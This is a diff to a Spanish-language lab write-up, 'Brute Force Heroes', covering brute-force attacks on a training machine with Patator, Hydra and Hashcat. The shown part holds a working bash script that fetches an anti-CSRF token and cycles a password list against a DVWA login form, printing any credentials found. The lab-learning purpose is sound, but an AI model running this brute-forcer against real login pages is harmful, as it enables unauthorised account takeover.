@@ -1,6 +1,6 @@
 ---
 title: "Brute Force Heroes"
-description: "Brute Force Heroes"
+description: "Documenta la fase de reconocimiento y los ataques de fuerza bruta a una máquina, incluyendo escaneo de puertos, uso de Patator, un script anti-CSRF, Hydra para formularios web y SSH, y Hashcat para cracking de contraseñas."
 pubDate: 2025-05-20
 ---
 
@@ -48,7 +48,8 @@ SUCCESS="Location: index.php"
 
 ## Anti CSRF token
 CSRF="$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
-[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1
+[[ "$?" -ne 0 ]] && echo -e '
+[!] Issue connecting! #1' && exit 1
 
 ## Counter
 i=0
@@ -68,13 +69,16 @@ while read -r _PASS; do
     ## Connect to server
     #CSRF=$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | awk -F "'" '{print $2}' )
     REQUEST="$( curl -s -i -b /tmp/dvwa.cookie --data "username=${_USER}&password=${_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" )"
-    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'
+    [[ $? -ne 0 ]] && echo -e '
+[!] Issue connecting! #2'
 
     ## Check response
     echo "${REQUEST}" | grep -q "${SUCCESS}"
     if [[ "$?" -eq 0 ]]; then
       ## Success!
-      echo -e "\n\n[i] Found!"
+      echo -e "
+
+[i] Found!"
       echo "[i] Username: ${_USER}"
       echo "[i] Password: ${_PASS}"
       break 2
